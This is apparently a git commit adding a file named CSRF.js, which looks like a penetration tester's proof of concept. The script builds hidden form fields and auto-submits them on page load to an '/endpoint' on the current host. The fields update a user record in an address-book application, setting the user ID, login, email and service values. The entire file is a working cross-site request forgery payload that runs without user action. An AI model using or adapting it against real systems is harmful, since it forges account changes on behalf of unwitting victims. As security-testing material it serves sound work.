993a599a44c320501db3e89419299f2301b7df82
YBeattie <68608803+YohanBeattie@users.noreply.github.com>
2025-05-28 11:34:25 +0200

    Create CSRF.js

---
+++ CSRF.js
@@ -0,0 +1,38 @@
+function submitForm() {
+    alert(window.location.hostname)
+    var hostname = window.location.hostname
+
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'http://'+hostname+'/endpoint';
+
+    var formElements = [
+        { name: "Agent", value: "AddressBook" },
+        { name: "Order", value: "Update" },
+        { name: "IdUser", value: "58898" },
+        { name: "IdRightTemplate", value: "0" },
+        { name: "Login", value: "1234567C" },
+        { name: "Civility", value: "" },
+        { name: "Lastname", value: "T3" },
+        { name: "Firstname", value: "T3" },
+        { name: "Service", value: "Gestionnaire" },
+        { name: "Email", value: "pentest1@algosecure.fr" },
+        { name: "IdLanguage", value: "FR" },
+        { name: "UserType", value: "" },
+        { name: "DossierFilter", value: "" }
+    ];
+
+    formElements.forEach(function(element) {
+        var input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = element.name;
+        input.value = element.value;
+        form.appendChild(input);
+    });
+
+    document.body.appendChild(form);
+
+    form.submit();
+}
+
+window.onload = submitForm;
